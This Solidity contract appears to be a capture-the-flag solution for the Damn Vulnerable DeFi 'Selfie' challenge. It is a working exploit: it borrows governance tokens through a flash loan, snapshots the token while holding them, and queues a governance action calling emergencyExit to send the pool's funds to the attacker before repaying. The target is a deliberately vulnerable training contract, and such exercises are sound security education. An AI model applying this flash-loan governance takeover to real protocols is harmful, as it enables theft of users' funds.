// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../../DamnValuableTokenSnapshot.sol";
import {SelfiePool, IERC3156FlashBorrower} from "./SelfiePool.sol";

contract FlashLoanReceiver is IERC3156FlashBorrower {
    SimpleGovernance governance;
    SelfiePool pool;
    address immutable player;

    constructor(address _governance, address _pool) {
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        player = msg.sender;
    }

    function takeFlashLoan(address token, uint256 amount) external {
        pool.flashLoan(this, address(token), amount, "0x");
    }

    function onFlashLoan(
        address,
        address _token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        token.snapshot();

        governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );

        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
